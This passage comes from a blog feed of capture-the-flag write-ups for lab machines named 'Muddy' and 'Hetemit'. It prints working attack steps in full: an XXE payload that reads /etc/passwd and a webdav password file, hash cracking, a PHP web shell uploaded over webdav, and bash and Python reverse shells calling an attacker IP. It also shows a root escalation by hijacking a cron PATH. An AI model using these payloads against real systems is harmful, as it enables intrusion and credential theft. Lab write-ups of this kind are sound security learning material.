&amp;lt;/soapenv:Envelope&amp;gt;&apos;&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;http://muddy.ugc:8888/muddy/soap11&apos;&lt;/span&gt; | xmllint &lt;span class=&quot;nt&quot;&gt;--format&lt;/span&gt; -
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file:///etc/passwd&lt;/code&gt; will be included in a response if our code successfully executes.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Here is the response.&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-md highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;nt&quot;&gt;&amp;lt;SOAP-ENV:Body&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;SOAP-ENV:encodingStyle=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;ns:checkoutResponse&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;&amp;lt;result&amp;gt;&lt;/span&gt;Serial number: 
	  [...]
	  
	  ian:x:1000:1000::/home/ian:/bin/sh
	  
	  [...]
	  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/result&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/ns:checkoutResponse&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/SOAP-ENV:Body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/SOAP-ENV:Envelope&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Perfect! From the enumeration phase, we also recognized a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;webdav&lt;/code&gt; service running on port 80.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ffuf &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://muddy.ugc/FUZZ &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/seclists/Discovery/Web-Content/big.txt

...
index.php               &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Status: 200, Size: 19195, Words: 860, Lines: 351]
javascript              &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Status: 301, Size: 321, Words: 20, Lines: 10]
server-status           &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Status: 403, Size: 279, Words: 20, Lines: 10]
webdav                  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Status: 401, Size: 461, Words: 42, Lines: 15]
wp-admin                &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Status: 301, Size: 319, Words: 20, Lines: 10]
wp-content              &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Status: 301, Size: 321, Words: 20, Lines: 10]
wp-includes             &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Status: 301, Size: 322, Words: 20, Lines: 10]
xmlrpc.php              &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Status: 405, Size: 42, Words: 6, Lines: 1]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now, we can try to read &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;webdav&lt;/code&gt; configuration file to retain the admin credentials.&lt;/p&gt;

&lt;p&gt;With the XEE vulnerability we have spotted earlier, adjust the file from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/www/html/webdav/passwd.dav&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Primarily, our command is completely similar but the payload.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-X&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;$&apos;POST&apos;&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
...
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;ENTITY passwd SYSTEM &lt;span class=&quot;s2&quot;&gt;&quot;file:///var/www/html/webdav/passwd.dav&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
...
      &amp;lt;result&amp;gt;Serial number: administrant:&lt;span class=&quot;nv&quot;&gt;$apr1$GUG1OnCu$uiSLaAQojCm14lPMwISDi0&lt;/span&gt;&amp;lt;/result&amp;gt;
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The encrypted password can then be cracked with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hashcat&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;hashcat &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; 1600 &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; 0 &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt; /usr/share/wordlists/rockyou.txt
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...]
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Filename..: /usr/share/wordlists/rockyou.txt
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Passwords.: 14344392                         
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Bytes.....: 139921507
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Keyspace..: 14344385                         
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Runtime...: 1 sec                            

&lt;span class=&quot;nv&quot;&gt;$apr1$GUG1OnCu$uiSLaAQojCm14lPMwISDi0&lt;/span&gt;:sleepless
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The cracked credentials is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;administrant:sleepless&lt;/code&gt;, which we abuse to bypass &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;webdav&lt;/code&gt; login prompt.&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;exploitation&quot;&gt;&lt;strong&gt;Exploitation&lt;/strong&gt;&lt;/h1&gt;

&lt;h4 id=&quot;webdav-file-upload&quot;&gt;&lt;strong&gt;WebDav File Upload&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;To upload a malcious shell, we use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;[1]. Upload a malicious &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.txt&lt;/code&gt; file&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;cmback.txt
&amp;lt;?php system&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;1&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;?&amp;gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; administrant:sleepless &lt;span class=&quot;nt&quot;&gt;-T&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;cmback.txt&apos;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;http://muddy.ugc/webdav/&apos;&lt;/span&gt;
...
&amp;lt;title&amp;gt;201 Created&amp;lt;/title&amp;gt;
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;[2]. Move the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.txt&lt;/code&gt; extention to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.php&lt;/code&gt; extention.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-X&lt;/span&gt; MOVE &lt;span class=&quot;nt&quot;&gt;--header&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;Destination:http://muddy.ugc/webdav/cmback.php&apos;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;http://muddy.ugc/webdav/cmback.txt&apos;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; administrant:sleepless
...
&amp;lt;title&amp;gt;201 Created&amp;lt;/title&amp;gt;
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;201 Created&lt;/code&gt; code means both operations are successful. Next, we try to trigger the code.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; administrant:sleepless &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; http://muddy.ugc/webdav/cmback.php&lt;span class=&quot;se&quot;&gt;\?&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;whoami                                                                                                        &lt;/span&gt;1 ⚙
www-data
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;and boom! → Remote Code Execution (RCE)!&lt;/p&gt;

&lt;p&gt;Let’s us pull a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bash&lt;/code&gt; reverse shell.&lt;/p&gt;

&lt;div class=&quot;language-md highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash -c &lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.49.227/80 0&amp;gt;&amp;amp;1&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;It’s always a good idea to URL-encode the payload.&lt;/p&gt;

&lt;div class=&quot;language-md highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash+-c+%22bash+-i+%3E%26+%2Fdev%2Ftcp%2F192.168.49.227%2F80+0%3E%261%22
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The final command is:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; administrant:sleepless &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; http://muddy.ugc/webdav/cmback.php&lt;span class=&quot;se&quot;&gt;\?&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;bash+-c+%22bash+-i+%3E%26+%2Fdev%2Ftcp%2F192.168.49.227%2F80+0%3E%261%22
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After executed, our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc&lt;/code&gt; should catch the reverse shell at port 80 as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www-data&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 80     
listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 80 ...
connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.49.227] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.227.161] 55638
bash: cannot &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;terminal process group &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;574&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: Inappropriate ioctl &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;device
bash: no job control &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;this shell
www-data@muddy:/var/www/html/webdav&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;privilege-escalation&quot;&gt;&lt;strong&gt;Privilege Escalation&lt;/strong&gt;&lt;/h1&gt;

&lt;h4 id=&quot;crontab&quot;&gt;&lt;strong&gt;Crontab&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;Locally gather the target system divulges a vulnerable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;crontab&lt;/code&gt; service.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@muddy:/var/www/html&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/crontab

&lt;span class=&quot;nv&quot;&gt;SHELL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/bin/sh
&lt;span class=&quot;nv&quot;&gt;PATH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/dev/shm:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

...

&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;   root    netstat &lt;span class=&quot;nt&quot;&gt;-tlpn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /root/status &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; service apache2 status &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; /root/status &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; service mysql status &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; /root/status
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;netstat ...&lt;/code&gt; command is orderly defined in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PATH&lt;/code&gt; environment.&lt;/p&gt;

&lt;p&gt;It’s worth noticing that we have a full control over the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/dev/shm&lt;/code&gt; path, where cronjob will navigate to and execute its command.&lt;/p&gt;

&lt;p&gt;At this point, we can inject a malicious &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;netstat&lt;/code&gt; shell, which then executes commands of our choices as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@muddy:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;chmod +s /bin/bash&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /dev/shm/netstat
www-data@muddy:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chmod &lt;/span&gt;777 /dev/shm/netstat
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After a minute, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/bash&lt;/code&gt; command is dressed up with a SUID bit, we then run&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@muddy:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;bash &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt;
bash-5.0# &lt;span class=&quot;nb&quot;&gt;whoami
&lt;/span&gt;root
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;and become root!&lt;/p&gt;</content><author><name></name></author><category term="ctf" /><category term="pg" /><category term="linux" /><summary type="html">Summary of Result Remote enumeration discloses a XML External Entity (XEE) vulnerability of ladon running on a higher port of a web application. Misusing XEE to read a configuration file, which bears credentials of webdav service. With the credentials, we can exploit authenticated WebDav file upload to secure an initial access. We then escalate our privilege by leveraging path hijacking vulnerability of a misconfigured crontab.</summary></entry><entry><title type="html">Hetemit - OSPG</title><link href="https://jayngng.github.io/blog/hetemit-ospg/" rel="alternate" type="text/html" title="Hetemit - OSPG" /><published>2021-09-01T17:12:17+10:00</published><updated>2021-09-01T17:12:17+10:00</updated><id>https://jayngng.github.io/blog/hetemit---ospg</id><content type="html" xml:base="https://jayngng.github.io/blog/hetemit-ospg/">&lt;h1 id=&quot;summary-of-result&quot;&gt;&lt;strong&gt;Summary of Result&lt;/strong&gt;&lt;/h1&gt;
&lt;p&gt;Hetemit is a system where we’ll exploit the &lt;strong&gt;Code Injection&lt;/strong&gt; vulnerability to acquire an initial access. We’ll then escalate our privilege by abusing &lt;strong&gt;a misconfigured service file&lt;/strong&gt; and compromise &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; access.&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;enumeration&quot;&gt;&lt;strong&gt;Enumeration&lt;/strong&gt;&lt;/h1&gt;

&lt;h4 id=&quot;nmap&quot;&gt;&lt;strong&gt;Nmap&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;We’ll begin with a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; scan.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-vv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oA&lt;/span&gt; nmap/services 192.168.118.117
PORT      STATE SERVICE     REASON         VERSION
21/tcp    open  ftp         syn-ack ttl 63 vsftpd 3.0.3
22/tcp    open  ssh         syn-ack ttl 63 OpenSSH 8.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
80/tcp    open  http        syn-ack ttl 63 Apache httpd 2.4.37 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;centos&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
139/tcp   open  netbios-ssn syn-ack ttl 63 Samba smbd 4.6.2
445/tcp   open  netbios-ssn syn-ack ttl 63 Samba smbd 4.6.2
18000/tcp open  biimenu?    syn-ack ttl 63
50000/tcp open  http        syn-ack ttl 63 Werkzeug httpd 1.0.1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Python 3.6.8&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;→ There are a few open services. Within the scope of the writeup, we focus on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP&lt;/code&gt; service running on port &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;50000&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h4 id=&quot;http50000&quot;&gt;&lt;strong&gt;HTTP/50000&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;Navigate to the web application, we notice that there are two directories listed.&lt;/p&gt;

&lt;div class=&quot;language-md highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/generate
/verify
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Both directories have their own functions, we are particularly interested in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/verify&lt;/code&gt; one.&lt;/p&gt;

&lt;p&gt;Let’s us try to send a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;POST&lt;/code&gt; request against the directory &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/verify&lt;/code&gt; and the body request is filled with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;code&lt;/code&gt; parameter.&lt;/p&gt;

&lt;p&gt;The payload might look as following:&lt;/p&gt;

&lt;div class=&quot;language-md highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /verify HTTP/1.1
Host: 192.168.101.117:50000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,&lt;span class=&quot;ge&quot;&gt;*/*&lt;/span&gt;;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: _register_hetemit_session=GK6KJri2ylafDgK%2F6lIyUBw9ZFUG2JwfR2XUy%2Be%2BBxow52YsWOyvti%2FQ4YVuCMMzuGNZB%2FMy4NXQxqDQ%2FeNGm5IQFQW7f94Ou4PByd3u2B7pqfMazR0jVFdSF5vBSV4vUo0J5ZT%2FhHql%2BaR5TKp%2BAnKBITheUGIE7AHyAEbvc%2B5KeSFsQ5mdZrJz46COTOZXBdmvfLlMIEisXpzZPwA3uTow5ziDY54D2MrJDVtpCFQ5YWqaEZeSb0js5JggvLZF7K26sxfSr17MsEphdt%2FopNZxNR4kckDId5%2FsUV9Yla%2Bc--0LA3avph4XEwY4vn--zaptbla4hpI7tLNc87OpLw%3D%3D
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 8

code=whoami
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After the request was sent, we can further inspect response.&lt;/p&gt;

&lt;p&gt;Here is the response.&lt;/p&gt;

&lt;div class=&quot;language-md highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;HTTP/1.0 500 INTERNAL SERVER ERROR
Content-Type: text/html; charset=utf-8
Content-Length: 290
Server: Werkzeug/1.0.1 Python/3.6.8
Date: Fri, 20 Aug 2021 05:01:07 GMT

&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 3.2 Final//EN&quot;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;500 Internal Server Error&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;h1&amp;gt;&lt;/span&gt;Internal Server Error&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;p&amp;gt;&lt;/span&gt;The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.&lt;span class=&quot;nt&quot;&gt;&amp;lt;/p&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The response code &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;500 INTERNAL SERVER ERROR&lt;/code&gt; indicates that something is wrong at the backend. At this point, we fully comprehend that the server does not sanitize our input properly, which ends up our entry breaking something up at the other end.&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;exploitation&quot;&gt;&lt;strong&gt;Exploitation&lt;/strong&gt;&lt;/h1&gt;

&lt;h4 id=&quot;code-injection&quot;&gt;&lt;strong&gt;Code Injection&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;Previously, we identify the &lt;strong&gt;abnormal behaviour&lt;/strong&gt; from the server. It’s worth noticing that the server running on port 50000 is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Werkzeug&lt;/code&gt; (we can observe this from the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; result). Primarily, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Werkzeug&lt;/code&gt; is a web server written in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;python&lt;/code&gt;, if there is a potential code injection vulnerability, our payload should also be crafted in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;python&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Let’s us build a reverse shell in one line.&lt;/p&gt;

&lt;div class=&quot;language-md highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gs&quot;&gt;__import__&lt;/span&gt;(&quot;os&quot;).system(&quot;bash+-c+&apos;bash+-i+&amp;gt;%26+/dev/tcp/192.168.49.101/80+0&amp;gt;%261&apos;&quot;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

